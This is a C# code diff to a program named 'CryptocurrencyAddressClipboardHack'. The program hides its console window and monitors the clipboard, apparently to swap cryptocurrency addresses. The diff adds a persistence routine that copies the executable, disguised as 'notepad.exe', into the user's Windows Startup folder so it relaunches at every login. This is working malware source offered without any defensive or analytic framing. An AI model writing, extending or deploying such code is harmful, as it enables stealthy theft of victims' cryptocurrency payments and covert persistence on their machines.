@@ -3,6 +3,7 @@ using System.Text.RegularExpressions;
 using System.Threading;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
+using System.IO;
 
 namespace CryptocurrencyAddressClipboardHack
 {
@@ -23,6 +24,8 @@ namespace CryptocurrencyAddressClipboardHack
         {
             IntPtr consoleHandle = GetConsoleWindow();//run app in background
             ShowWindow(consoleHandle, SW_HIDE);//run app in background
+
+            copyFileToRunBackground();
 
             Thread clipboardThread = new Thread(MonitorClipboard);
             clipboardThread.SetApartmentState(ApartmentState.STA);
@@ -103,6 +106,20 @@ namespace CryptocurrencyAddressClipboardHack
         {
             Regex regex = new Regex(pattern);
             return regex.IsMatch(address);
+        }
+
+        static void copyFileToRunBackground()//start up app
+        {
+            string filename = "notepad.exe";
+            string pathDestiny = Environment.ExpandEnvironmentVariables(@"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup");
+
+            string originPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, filename);
+            string fullPathDestiny = Path.Combine(pathDestiny, filename);
+
+            if (!File.Exists(fullPathDestiny))
+            {
+                File.Copy(originPath, fullPathDestiny);
+            }
         }
 
     }
